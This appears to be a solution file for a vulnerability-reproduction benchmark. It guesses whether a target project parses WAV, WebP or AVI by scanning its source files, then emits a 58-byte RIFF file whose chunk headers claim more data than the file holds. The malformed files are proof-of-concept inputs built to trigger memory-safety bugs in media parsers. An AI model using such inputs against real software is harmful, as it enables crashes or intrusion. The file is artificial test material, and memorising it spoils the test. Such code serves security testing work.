import os
import io
import struct
import tarfile
import zipfile
from typing import Dict, Iterable, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = self._detect_target_format(src_path)
        if fmt == "webp":
            return self._make_webp_poc()
        if fmt == "avi":
            return self._make_avi_poc()
        return self._make_wav_poc()

    @staticmethod
    def _le32(x: int) -> bytes:
        return struct.pack("<I", x & 0xFFFFFFFF)

    def _make_wav_poc(self) -> bytes:
        # 58 bytes total
        riff_size = 50  # file_size - 8
        fmt_chunk_size = 16
        data_claim = 256
        fmt_data = struct.pack(
            "<HHIIHH",
            1,      # PCM
            1,      # mono
            8000,   # sample rate
            8000,   # byte rate
            1,      # block align
            8,      # bits per sample
        )
        data_payload = b"\x00" * 14
        poc = (
            b"RIFF" + self._le32(riff_size) + b"WAVE" +
            b"fmt " + self._le32(fmt_chunk_size) + fmt_data +
            b"data" + self._le32(data_claim) + data_payload
        )
        return poc

    def _make_webp_poc(self) -> bytes:
        # 58 bytes total
        riff_size = 50  # file_size - 8
        chunk_claim = 256
        # Minimal plausible VP8 bitstream header bytes (not necessarily decodable),
        # padded to fit within 58 bytes while claiming much larger size.
        vp8_header = b"\x00\x00\x00" + b"\x9d\x01\x2a" + b"\x10\x00" + b"\x10\x00"
        chunk_data = vp8_header + (b"\x00" * (34 - len(vp8_header)))
        poc = (
            b"RIFF" + self._le32(riff_size) + b"WEBP" +
            b"VP8 " + self._le32(chunk_claim) + chunk_data
        )
        return poc

    def _make_avi_poc(self) -> bytes:
        # 58 bytes total
        riff_size = 50  # file_size - 8
        list_claim = 256
        filler_len = 58 - (12 + 4 + 8 + 4)  # RIFF hdr + 'AVI ' + LIST hdr + list type
        filler = b"\x00" * max(0, filler_len)
        poc = (
            b"RIFF" + self._le32(riff_size) + b"AVI " +
            b"LIST" + self._le32(list_claim) + b"hdrl" + filler
        )
        return poc

    def _detect_target_format(self, src_path: str) -> str:
        scores: Dict[str, int] = {"wav": 0, "webp": 0, "avi": 0}
        try:
            for name, sample in self._iter_project_text_samples(src_path):
                self._score_sample(scores, name, sample)
        except Exception:
            pass

        best = max(scores.items(), key=lambda kv: kv[1])[0]
        if scores[best] <= 0:
            return "wav"
        if best == "webp" and scores["webp"] >= scores["wav"] + 2:
            return "webp"
        if best == "avi" and scores["avi"] >= scores["wav"] + 2:
            return "avi"
        return "wav"

    @staticmethod
    def _score_sample(scores: Dict[str, int], name: str, sample: bytes) -> None:
        ln = name.lower()
        if "webp" in ln:
            scores["webp"] += 10
        if ln.endswith(".webp"):
            scores["webp"] += 20
        if "vp8" in ln:
            scores["webp"] += 6

        if "wav" in ln:
            scores["wav"] += 8
        if "wave" in ln:
            scores["wav"] += 6
        if "riff" in ln:
            scores["wav"] += 2
            scores["webp"] += 2
            scores["avi"] += 2

        if "avi" in ln:
            scores["avi"] += 8
        if ln.endswith(".avi"):
            scores["avi"] += 20

        try:
            s = sample.decode("latin1", errors="ignore").lower()
        except Exception:
            return

        if "webp" in s:
            scores["webp"] += 10
        if "vp8" in s or "vp8l" in s or "vp8x" in s:
            scores["webp"] += 6

        if "wave" in s:
            scores["wav"] += 6
        if "wavio" in s or "wave_read" in s:
            scores["wav"] += 4
        if "fmt " in s or "data" in s:
            scores["wav"] += 2
        if "riff" in s:
            scores["wav"] += 2
            scores["webp"] += 2
            scores["avi"] += 2

        if "avi " in s or "avifile" in s:
            scores["avi"] += 6
        if "movi" in s or "hdrl" in s:
            scores["avi"] += 2

    def _iter_project_text_samples(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            yield from self._iter_dir_text_samples(src_path)
            return

        # Try tar first
        try:
            with tarfile.open(src_path, "r:*") as tf:
                yield from self._iter_tar_text_samples(tf)
                return
        except Exception:
            pass

        # Try zip
        try:
            with zipfile.ZipFile(src_path, "r") as zf:
                yield from self._iter_zip_text_samples(zf)
                return
        except Exception:
            pass

    @staticmethod
    def _iter_dir_text_samples(root: str) -> Iterable[Tuple[str, bytes]]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inl", ".inc", ".m", ".mm", ".rs", ".go", ".java", ".py"}
        total_bytes = 0
        max_total = 2_000_000
        max_files = 400
        files = 0
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if files >= max_files or total_bytes >= max_total:
                    return
                path = os.path.join(dirpath, fn)
                _, ext = os.path.splitext(fn.lower())
                if ext not in exts:
                    continue
                try:
                    st = os.stat(path)
                    if st.st_size <= 0:
                        continue
                    with open(path, "rb") as f:
                        data = f.read(8192)
                    yield (path, data)
                    total_bytes += len(data)
                    files += 1
                except Exception:
                    continue

    @staticmethod
    def _iter_tar_text_samples(tf: tarfile.TarFile) -> Iterable[Tuple[str, bytes]]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inl", ".inc", ".m", ".mm", ".rs", ".go", ".java", ".py"}
        total_bytes = 0
        max_total = 2_000_000
        max_files = 500
        files = 0
        for m in tf.getmembers():
            if files >= max_files or total_bytes >= max_total:
                return
            if not m.isfile():
                continue
            name = m.name
            _, ext = os.path.splitext(name.lower())
            if ext not in exts:
                continue
            if m.size <= 0:
                continue
            if m.size > 2_000_000:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read(8192)
                yield (name, data)
                total_bytes += len(data)
                files += 1
            except Exception:
                continue

    @staticmethod
    def _iter_zip_text_samples(zf: zipfile.ZipFile) -> Iterable[Tuple[str, bytes]]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inl", ".inc", ".m", ".mm", ".rs", ".go", ".java", ".py"}
        total_bytes = 0
        max_total = 2_000_000
        max_files = 500
        files = 0
        for zi in zf.infolist():
            if files >= max_files or total_bytes >= max_total:
                return
            if zi.is_dir():
                continue
            name = zi.filename
            _, ext = os.path.splitext(name.lower())
            if ext not in exts:
                continue
            if zi.file_size <= 0:
                continue
            if zi.file_size > 2_000_000:
                continue
            try:
                with zf.open(zi, "r") as f:
                    data = f.read(8192)
                yield (name, data)
                total_bytes += len(data)
                files += 1
            except Exception:
                continue